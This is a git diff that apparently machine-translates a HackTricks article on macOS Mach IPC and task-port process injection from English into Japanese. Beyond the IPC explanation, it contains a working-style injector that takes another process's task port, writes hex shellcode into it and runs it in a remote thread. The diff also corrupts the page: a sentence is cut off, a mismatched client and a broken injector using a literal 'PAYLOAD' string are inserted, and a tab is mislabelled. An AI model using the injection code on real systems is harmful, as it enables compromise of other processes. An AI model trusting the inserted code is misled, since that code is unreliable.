@@ -1,60 +1,59 @@
-# macOS IPC - Inter Process Communication
+# macOS IPC - プロセス間通信
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
 
-## Mach messaging via Ports
+## ポートを介したMachメッセージング
 
-Mach uses **tasks** as the **smallest unit** for sharing resources, and each task can contain **multiple threads**. These **tasks and threads are mapped 1:1 to POSIX processes and threads**.
+Machは、リソースの共有において**タスク**を最小単位として使用し、各タスクは**複数のスレッド**を含むことができます。これらの**タスクとスレッドは、POSIXプロセスとスレッドに1：1でマッピング**されます。
 
-Communication between tasks occurs via Mach Inter-Process Communication (IPC), utilising one-way communication channels. **Messages are transferred between ports**, which act like **message queues** managed by the kernel.
+タスク間の通信は、Machインタープロセス通信（IPC）を使用して行われ、片方向の通信チャネルを利用します。**メッセージはポート間で転送**され、カーネルによって管理される**メッセージキュー**のような役割を果たします。
 
-Port rights, which define what operations a task can perform, are key to this communication. The possible **port rights** are:
+タスクが実行できる操作を定義するポート権限は、この通信に重要です。可能な**ポート権限**は次のとおりです。
 
-* **Receive right**, which allows receiving messages sent to the port. Mach ports are MPSC (multiple-producer, single-consumer) queues, which means that there may only ever be **one receive right for each port** in the whole system (unlike with pipes, where multiple processes can all hold file descriptors to the read end of one pipe).
-  * A **task with the Receive** right can receive messages and **create Send rights**, allowing it to send messages. Originally only the **own task has Receive right over its por**t.
-* **Send right**, which allows sending messages to the port.
-* **Send-once right**, which allows sending one message to the port and then disappears.
-* **Port set right**, which denotes a _port set_ rather than a single port. Dequeuing a message from a port set dequeues a message from one of the ports it contains. Port sets can be used to listen on several ports simultaneously, a lot like `select`/`poll`/`epoll`/`kqueue` in Unix.
-* **Dead name**, which is not an actual port right, but merely a placeholder. When a port is destroyed, all existing port rights to the port turn into dead names.
+* **受信権限**：ポートに送信されたメッセージを受信することを許可します。MachポートはMPSC（複数プロデューサ、単一コンシューマ）キューであるため、システム全体で**ポートごとに受信権限は1つだけ**存在できます（複数のプロセスが1つのパイプの読み取りエンドに対するファイルディスクリプタを保持できるパイプとは異なります）。
+* **受信権限を持つタスク**は、メッセージを受信し、メッセージを送信するための**送信権限を作成**することができます。元々は**自分自身のタスクがポートに対して受信権限を持っていました**。
+* **送信権限**：ポートにメッセージを送信することを許可します。
+* **一度だけ送信権限**：ポートに1つのメッセージを送信し、その後消えます。
+* **ポートセット権限**：単一のポートではなく、_ポートセット_を示します。ポートセットからメッセージをデキューすると、そのポートセットに含まれるポートからメッセージがデキューされます。ポートセットは、Unixの`select`/`poll`/`epoll`/`kqueue`のように、複数のポートで同時にリッスンするために使用できます。
+* **デッドネーム**：実際のポート権限ではなく、単なるプレースホルダーです。ポートが破棄されると、ポートへのすべての既存のポート権限はデッドネームに変わります。
 
-**Tasks can transfer SEND rights to others**, enabling them to send messages back. **SEND rights can also be cloned, so a task can duplicate and give the right to a third task**. This, combined with an intermediary process known as the **bootstrap server**, allows for effective communication between tasks.
+**タスクはSEND権限を他のタスクに転送**することができ、それによりメッセージを送り返すことができます。**SEND権限は複製することもできるため、タスクはSEND権限を第三のタスクに複製して与える**ことができます。これにより、中間プロセスである**ブートストラップサーバー**との効果的な通信が可能になります。
 
-#### Steps:
+#### 手順：
 
-As it's mentioned, in order to establish the communication channel, the **bootstrap server** (**launchd** in mac) is involved.
+上記に述べたように、通信チャネルを確立するためには、**ブートストラップサーバー**（macでは**launchd**）が関与します。
 
-1. Task **A** initiates a **new port**, obtaining a **RECEIVE right** in the process.
-2. Task **A**, being the holder of the RECEIVE right, **generates a SEND right for the port**.
-3. Task **A** establishes a **connection** with the **bootstrap server**, providing the **port's service name** and the **SEND right** through a procedure known as the bootstrap register.
-4. Task **B** interacts with the **bootstrap server** to execute a bootstrap **lookup for the service** name. If successful, the **server duplicates the SEND right** received from Task A and **transmits it to Task B**.
-5. Upon acquiring a SEND right, Task **B** is capable of **formulating** a **message** and dispatching it **to Task A**.
+1. タスク**A**は**新しいポート**を初期化し、プロセス内で**受信権限**を取得します。
+2. 受信権限を持つタスク**A**は、ポートのために**SEND権限を生成**します。
+3. タスク**A**は、**ブートストラップサーバー**との**接続**を確立し、**ポートのサービス名**と**SEND権限**をブートストラップ登録という手順を通じて提供します。
+4. タスク**B**は、サービス名のために**ブートストラップサーバー**とやり取りし、ブートストラップの**サービス名の検索**を実行します。成功した場合、**サーバーはタスクAから受け取ったSEND権限を複製**し、**タスクBに送信**します。
+5. SEND権限を取得したタスク**B**は、メッセージを**作成**し、それを**タスクAに送信**することができます。
 
-The bootstrap server **cannot authenticate** the service name claimed by a task. This means a **task** could potentially **impersonate any system task**, such as falsely **claiming an authorization service name** and then approving every request.
+ブートストラップサーバーは、タスクが主張するサービス名を認証することはできません。これは、タスクが潜在的に**システムタスクをなりすます**ことができる可能性があることを意味します。たとえば、認証サービス名を偽って主張し、すべてのリクエストを承認することができます。
 
-Then, Apple stores the **names of system-provided services** in secure configuration files, located in **SIP-protected** directories: `/System/Library/LaunchDaemons` and `/System/Library/LaunchAgents`. Alongside each service name, the **associated binary is also stored**. The bootstrap server, will create and hold a **RECEIVE right for each of these service names**.
+その後、Appleはシステム提供のサービスの名前を、**SIPで保護された**ディレクトリにある安全な設定ファイルに保存します：`/System/Library/LaunchDaemons`および`/System/Library/LaunchAgents`。ブートストラップサーバーは、これらのサービス名ごとに**受信権限を作成**し、保持します。
 
-For these predefined services, the **lookup process differs slightly**. When a service name is being looked up, launchd starts the service dynamically. The new workflow is as follows:
+これらの事前定義されたサービスに対しては、**検索プロセスが若干異なります**。サービス名が検索されると、launchdはサービスを動的に起動します。新しいワークフローは次のようになります。
 
-* Task **B** initiates a bootstrap **lookup** for a service name.
-* **launchd** checks if the task is running and if it isn’t, **starts** it.
-* Task **A** (the service) performs a **bootstrap check-in**. Here, the **bootstrap** server creates a SEND right, retains it, and **transfers the RECEIVE right to Task A**.
-* launchd duplicates the **SEND right and sends it to Task B**.
+* タスク**B**は、サービス名のためにブートストラップの**検索**を開始します。
+* **launchd**は、タスクが実行中かどうかをチェックし、実行されていない場合は**起動**します。
+* タスク**A**（サービス）は、**ブートストラップチェックイン**を実行します。ここでは、**ブートストラップ**サーバーがSEND権限を作成し、保持し、**受信権限をタスクAに転送**します。
+* launchdは**SEND権限を複製し、タスクBに送信**します。
 
-However, this process only applies to predefined system tasks. Non-system tasks still operate as described originally, which could potentially allow for impersonation.
+ただし、このプロセスは事前定義されたシステムタスクにのみ適用され
+### コード例
 
-### Code example
-
-Note how the **sender** **allocates** a port, create a **send right** for the name `org.darlinghq.example` and send it to the **bootstrap server** while the sender asked for the **send right** of that name and used it to **send a message**.
+**送信者**がポートを**割り当て**し、名前 `org.darlinghq.example` のために**送信権**を作成し、それを**ブートストラップサーバー**に送信する方法に注目してください。送信者はその名前の**送信権**を要求し、それを使用して**メッセージを送信**します。
 
 {% tabs %}
 {% tab title="receiver.c" %}
@@ -68,64 +67,114 @@ Note how the **sender** **allocates** a port, create a **send right** for the na
 
 int main() {
 
-    // Create a new port.
-    mach_port_t port;
-    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+// Create a new port.
+mach_port_t port;
+kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+if (kr != KERN_SUCCESS) {
+printf("mach_port_allocate() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("mach_port_allocate() created port right name %d\n", port);
+
+
+// Give us a send right to this port, in addition to the receive right.
+kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+if (kr != KERN_SUCCESS) {
+printf("mach_port_insert_right() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("mach_port_insert_right() inserted a send right\n");
+
+
+// Send the send right to the bootstrap server, so that it can be looked up by other processes.
+kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
+if (kr != KERN_SUCCESS) {
+printf("bootstrap_register() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("bootstrap_register()'ed our port\n");
+
+
+// Wait for a message.
+struct {
+mach_msg_header_t header;
+char some_text[10];
+int some_number;
+mach_msg_trailer_t trailer;
+} message;
+
+kr = mach_msg(
+&message.header,  // Same as (mach_msg_header_t *) &message.
+MACH_RCV_MSG,     // Options. We're receiving a message.
+0,                // Size of the message being sent, if sending.
+sizeof(message),  // Size of the buffer for receiving.
+port,             // The port to receive a message on.
+MACH_MSG_TIMEOUT_NONE,
+MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
+);
+if (kr != KERN_SUCCESS) {
+printf("mach_msg() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("Got a message\n");
+
+message.some_text[9] = 0;
+printf("Text: %s, number: %d\n", message.some_text, message.some_number);
+}
+```
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <mach/mach.h>
+#include <mach/message.h>
+
+#define BUFFER_SIZE 1024
+
+int main(int argc, char** argv) {
+    mach_port_t server_port;
+    kern_return_t kr;
+    char buffer[BUFFER_SIZE];
+
+    // Connect to the server port
+    kr = task_get_special_port(mach_task_self(), TASK_AUDIT_PORT, &server_port);
     if (kr != KERN_SUCCESS) {
-        printf("mach_port_allocate() failed with code 0x%x\n", kr);
+        printf("Failed to get server port: %s\n", mach_error_string(kr));
         return 1;
     }
-    printf("mach_port_allocate() created port right name %d\n", port);
 
+    // Send a message to the server
+    mach_msg_header_t* msg = (mach_msg_header_t*)buffer;
+    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+    msg->msgh_size = sizeof(buffer);
+    msg->msgh_remote_port = server_port;
+    msg->msgh_local_port = MACH_PORT_NULL;
+    msg->msgh_reserved = 0;
+    msg->msgh_id = 0;
 
-    // Give us a send right to this port, in addition to the receive right.
-    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+    kr = mach_msg(msg, MACH_SEND_MSG, msg->msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
     if (kr != KERN_SUCCESS) {
-        printf("mach_port_insert_right() failed with code 0x%x\n", kr);
+        printf("Failed to send message: %s\n", mach_error_string(kr));
         return 1;
     }
-    printf("mach_port_insert_right() inserted a send right\n");
 
-
-    // Send the send right to the bootstrap server, so that it can be looked up by other processes.
-    kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
+    // Receive a response from the server
+    kr = mach_msg(msg, MACH_RCV_MSG, 0, msg->msgh_size, server_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
     if (kr != KERN_SUCCESS) {
-        printf("bootstrap_register() failed with code 0x%x\n", kr);
+        printf("Failed to receive message: %s\n", mach_error_string(kr));
         return 1;
     }
-    printf("bootstrap_register()'ed our port\n");
 
+    // Print the response
+    printf("Received message: %s\n", buffer);
 
-    // Wait for a message.
-    struct {
-        mach_msg_header_t header;
-        char some_text[10];
-        int some_number;
-        mach_msg_trailer_t trailer;
-    } message;
-
-    kr = mach_msg(
-        &message.header,  // Same as (mach_msg_header_t *) &message.
-        MACH_RCV_MSG,     // Options. We're receiving a message.
-        0,                // Size of the message being sent, if sending.
-        sizeof(message),  // Size of the buffer for receiving.
-        port,             // The port to receive a message on.
-        MACH_MSG_TIMEOUT_NONE,
-        MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
-    );
-    if (kr != KERN_SUCCESS) {
-        printf("mach_msg() failed with code 0x%x\n", kr);
-        return 1;
-    }
-    printf("Got a message\n");
-
-    message.some_text[9] = 0;
-    printf("Text: %s, number: %d\n", message.some_text, message.some_number);
+    return 0;
 }
 ```
 {% endtab %}
 
-{% tab title="sender.c" %}
+{% tab title="receiver.c" %}
 ```c
 // Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
 // gcc sender.c -o sender
@@ -136,66 +185,66 @@ int main() {
 
 int main() {
 
-    // Lookup the receiver port using the bootstrap server.
-    mach_port_t port;
-    kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
-    if (kr != KERN_SUCCESS) {
-        printf("bootstrap_look_up() failed with code 0x%x\n", kr);
-        return 1;
-    }
-    printf("bootstrap_look_up() returned port right name %d\n", port);
+// Lookup the receiver port using the bootstrap server.
+mach_port_t port;
+kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
+if (kr != KERN_SUCCESS) {
+printf("bootstrap_look_up() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("bootstrap_look_up() returned port right name %d\n", port);
 
 
-    // Construct our message.
-    struct {
-        mach_msg_header_t header;
-        char some_text[10];
-        int some_number;
-    } message;
+// Construct our message.
+struct {
+mach_msg_header_t header;
+char some_text[10];
+int some_number;
+} message;
 
-    message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
-    message.header.msgh_remote_port = port;
-    message.header.msgh_local_port = MACH_PORT_NULL;
+message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+message.header.msgh_remote_port = port;
+message.header.msgh_local_port = MACH_PORT_NULL;
 
-    strncpy(message.some_text, "Hello", sizeof(message.some_text));
-    message.some_number = 35;
+strncpy(message.some_text, "Hello", sizeof(message.some_text));
+message.some_number = 35;
 
-    // Send the message.
-    kr = mach_msg(
-        &message.header,  // Same as (mach_msg_header_t *) &message.
-        MACH_SEND_MSG,    // Options. We're sending a message.
-        sizeof(message),  // Size of the message being sent.
-        0,                // Size of the buffer for receiving.
-        MACH_PORT_NULL,   // A port to receive a message on, if receiving.
-        MACH_MSG_TIMEOUT_NONE,
-        MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
-    );
-    if (kr != KERN_SUCCESS) {
-        printf("mach_msg() failed with code 0x%x\n", kr);
-        return 1;
-    }
-    printf("Sent a message\n");
+// Send the message.
+kr = mach_msg(
+&message.header,  // Same as (mach_msg_header_t *) &message.
+MACH_SEND_MSG,    // Options. We're sending a message.
+sizeof(message),  // Size of the message being sent.
+0,                // Size of the buffer for receiving.
+MACH_PORT_NULL,   // A port to receive a message on, if receiving.
+MACH_MSG_TIMEOUT_NONE,
+MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
+);
+if (kr != KERN_SUCCESS) {
+printf("mach_msg() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("Sent a message\n");
 }
 ```
 {% endtab %}
 {% endtabs %}
 
-### Privileged Ports
+### 特権ポート
 
-* **Host port**: If a process has **Send** privilege over this port he can get **information** about the **system** (e.g. `host_processor_info`).
-* **Host priv port**: A process with **Send** right over this port can perform **privileged actions** like loading a kernel extension. The **process need to be root** to get tis permission.
-  * Moreover, in order to call **`kext_request`** API it's needed to have the entitlement **`com.apple.private.kext`** which is only given to Apple binaries.
-* **Task name port:** An unprivileged version of the _task port_. It references the task, but does not allow controlling it. The only thing that seems to be available through it is `task_info()`.
-* **Task port** (aka kernel port)**:** With Send permission over this port it's possible to control the task (read/write memory, create threads...).
-  * Call `mach_task_self()` to **get the name** for this port for the caller task. This port is only **inherited** across **`exec()`**; a new task created with `fork()` gets a new task port (as a special case, a task also gets a new task port after `exec()`ing a suid binary). The only way to spawn a task and get its port is to perform the ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) while doing a `fork()`.
-  * These are the restrictions to access the port (from `macos_task_policy` from the binary `AppleMobileFileIntegrity`):
-    * If the app has **`com.apple.security.get-task-allow` entitlement** processes from the **same user can access the task port** (commonly added by Xcode for debugging). The **notarization** process won't allow it to production releases.
-    * Apps the **`com.apple.system-task-ports`** entitlement can get the **task port for any** process, except the kernel. In older versions it was called **`task_for_pid-allow`**. This is only granted to Apple applications.
-    * **Root can access task ports** of applications **not** compiled with a **hardened** runtime (and not from Apple).
+* **ホストポート**: プロセスがこのポートに対して**送信権限**を持っている場合、システムに関する**情報**（例：`host_processor_info`）を取得できます。
+* **ホスト特権ポート**: このポートに対して**送信権限**を持つプロセスは、カーネル拡張をロードするなどの**特権アクション**を実行できます。この権限を取得するには、**プロセスはルート権限**を持つ必要があります。
+* さらに、**`kext_request`** APIを呼び出すためには、Appleのバイナリにのみ与えられる**`com.apple.private.kext`**というエンタイトルメントが必要です。
+* **タスク名ポート**: _タスクポート_の非特権バージョンです。タスクを参照することはできますが、制御することはできません。これを通じて利用できる唯一のものは`task_info()`のようです。
+* **タスクポート**（またはカーネルポート）**:** このポートに対して送信権限を持つと、タスクを制御することができます（メモリの読み書き、スレッドの作成など）。
+* 呼び出し元タスクのためのこのポートの**名前を取得**するには、`mach_task_self()`を呼び出します。このポートは**`exec()`を跨いでのみ継承**されます。`fork()`で作成された新しいタスクは新しいタスクポートを取得します（特別なケースとして、suidバイナリを`exec()`するとタスクも新しいタスクポートを取得します）。タスクを生成し、そのポートを取得する唯一の方法は、`fork()`を行う際に["ポートスワップダンス"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)を実行することです。
+* これらはポートへのアクセス制限です（バイナリ`AppleMobileFileIntegrity`の`macos_task_policy`から）：
+* アプリに**`com.apple.security.get-task-allow`エンタイトルメント**がある場合、**同じユーザーのプロセスはタスクポートにアクセス**できます（デバッグのためにXcodeによって一般的に追加されます）。**ノータリゼーション**プロセスは本番リリースでは許可しません。
+* **`com.apple.system-task-ports`**エンタイトルメントを持つアプリは、カーネルを除く**任意の**プロセスの**タスクポート**を取得できます。以前のバージョンでは**`task_for_pid-allow`**と呼ばれていました。これはAppleのアプリケーションにのみ付与されます。
+* **ルートユーザーは、ハード化されたランタイムでコンパイルされていないアプリケーション**（およびAppleのアプリケーションではない）のタスクポートにアクセスできます。
 
-### Shellcode Process Injection via Task port&#x20;
+### タスクポートを介したシェルコードのプロセスインジェクション
 
-You can grab a shellcode from:
+シェルコードは次から取得できます：
 
 {% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
 [arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
@@ -209,34 +258,81 @@ You can grab a shellcode from:
 #import <Foundation/Foundation.h>
 
 int main(int argc, const char * argv[]) {
+@autoreleasepool {
+NSLog(@"Process ID: %d", [[NSProcessInfo processInfo] processIdentifier]);
+[NSThread sleepForTimeInterval:99999];
+}
+return 0;
+}
+```
+{% tab title="entitlements.plist" %}エンタイトルメント.plist
+```xml
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+<key>com.apple.security.get-task-allow</key>
+<true/>
+</dict>
+</plist>
+```
+{% tabs %}
+{% tab title="English" %}
+```objective-c
+#import <Foundation/Foundation.h>
+#import <mach/mach.h>
+#import <mach/mach_vm.h>
+
+int main(int argc, const char * argv[]) {
     @autoreleasepool {
-        NSLog(@"Process ID: %d", [[NSProcessInfo processInfo] processIdentifier]);
-        [NSThread sleepForTimeInterval:99999];
+        if (argc != 2) {
+            printf("Usage: %s <pid>\n", argv[0]);
+            return 0;
+        }
+        
+        pid_t target_pid = atoi(argv[1]);
+        mach_port_t target_task;
+        kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &target_task);
+        if (kr != KERN_SUCCESS) {
+            printf("Failed to get task for pid %d: %s\n", target_pid, mach_error_string(kr));
+            return 0;
+        }
+        
+        const char *payload = "PAYLOAD";
+        mach_vm_address_t remote_address;
+        mach_vm_size_t payload_size = strlen(payload) + 1;
+        kr = mach_vm_allocate(target_task, &remote_address, payload_size, VM_FLAGS_ANYWHERE);
+        if (kr != KERN_SUCCESS) {
+            printf("Failed to allocate memory in target task: %s\n", mach_error_string(kr));
+            return 0;
+        }
+        
+        kr = mach_vm_write(target_task, remote_address, (vm_offset_t)payload, payload_size);
+        if (kr != KERN_SUCCESS) {
+            printf("Failed to write payload to target task: %s\n", mach_error_string(kr));
+            return 0;
+        }
+        
+        mach_vm_address_t remote_entrypoint = remote_address;
+        kr = thread_create_running(target_task, &remote_entrypoint);
+        if (kr != KERN_SUCCESS) {
+            printf("Failed to create remote thread: %s\n", mach_error_string(kr));
+            return 0;
+        }
+        
+        printf("Code injected successfully\n");
     }
     return 0;
 }
 ```
 {% endtab %}
-
-{% tab title="entitlements.plist" %}
-```xml
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>com.apple.security.get-task-allow</key>
-    <true/>
-</dict>
-</plist>
-```
-{% endtab %}
 {% endtabs %}
+</details>
 
-**Compile** the previous program and add the **entitlements** to be able to inject code with the same user (if not you will need to use **sudo**).
+Compile the previous program and add the entitlements to be able to inject code with the same user (if not you will need to use sudo).
 
 <details>
 
 <summary>injector.m</summary>
-
 ```objectivec
 // gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
 
@@ -250,18 +346,18 @@ int main(int argc, const char * argv[]) {
 
 kern_return_t mach_vm_allocate
 (
-        vm_map_t target,
-        mach_vm_address_t *address,
-        mach_vm_size_t size,
-        int flags
+vm_map_t target,
+mach_vm_address_t *address,
+mach_vm_size_t size,
+int flags
 );
 
 kern_return_t mach_vm_write
 (
-        vm_map_t target_task,
-        mach_vm_address_t address,
-        vm_offset_t data,
-        mach_msg_type_number_t dataCnt
+vm_map_t target_task,
+mach_vm_address_t address,
+vm_offset_t data,
+mach_msg_type_number_t dataCnt
 );
 
 
@@ -279,137 +375,134 @@ char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\
 
 int inject(pid_t pid){
 
-    task_t remoteTask;
+task_t remoteTask;
 
-    // Get access to the task port of the process we want to inject into
-    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
-    if (kr != KERN_SUCCESS) {
-        fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
-        return (-1);
-    }
-    else{
-        printf("Gathered privileges over the task port of process: %d\n", pid);
-    }
+// Get access to the task port of the process we want to inject into
+kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
+if (kr != KERN_SUCCESS) {
+fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
+return (-1);
+}
+else{
+printf("Gathered privileges over the task port of process: %d\n", pid);
+}
 
-    // Allocate memory for the stack
-    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
-    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
-    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
-    
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
-        return (-2);
-    }
-    else
-    {
+// Allocate memory for the stack
+mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
+mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
 
-        fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
-    }
-    
-    // Allocate memory for the code
-    remoteCode64 = (vm_address_t) NULL;
-    kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
+else
+{
 
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
-        return (-2);
-    }
-    
+fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
+}
 
-    // Write the shellcode to the allocated memory
-    kr = mach_vm_write(remoteTask,                   // Task port
-	                   remoteCode64,                 // Virtual Address (Destination)
-	                   (vm_address_t) injectedCode,  // Source
-	                    0xa9);                       // Length of the source
+// Allocate memory for the code
+remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
+
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
 
 
-    if (kr != KERN_SUCCESS)
-    {
-	fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
-	return (-3);
-    }
+// Write the shellcode to the allocated memory
+kr = mach_vm_write(remoteTask,                   // Task port
+remoteCode64,                 // Virtual Address (Destination)
+(vm_address_t) injectedCode,  // Source
+0xa9);                       // Length of the source
 
 
-    // Set the permissions on the allocated code memory
-    kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
+return (-3);
+}
 
-    if (kr != KERN_SUCCESS)
-    {
-	fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
-	return (-4);
-    }
 
-    // Set the permissions on the allocated stack memory
-    kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
-	
-    if (kr != KERN_SUCCESS)
-    {
-	fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
-	return (-4);
-    }
+// Set the permissions on the allocated code memory
+kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
 
-    // Create thread to run shellcode
-    struct arm_unified_thread_state remoteThreadState64;
-    thread_act_t         remoteThread;
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
+return (-4);
+}
 
-    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
+// Set the permissions on the allocated stack memory
+kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
 
-    remoteStack64 += (STACK_SIZE / 2); // this is the real stack
-        //remoteStack64 -= 8;  // need alignment of 16
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
+return (-4);
+}
 
-    const char* p = (const char*) remoteCode64;
+// Create thread to run shellcode
+struct arm_unified_thread_state remoteThreadState64;
+thread_act_t         remoteThread;
 
-    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
-    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
-    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
-    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
+memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
 
-    printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );
+remoteStack64 += (STACK_SIZE / 2); // this is the real stack
+//remoteStack64 -= 8;  // need alignment of 16
 
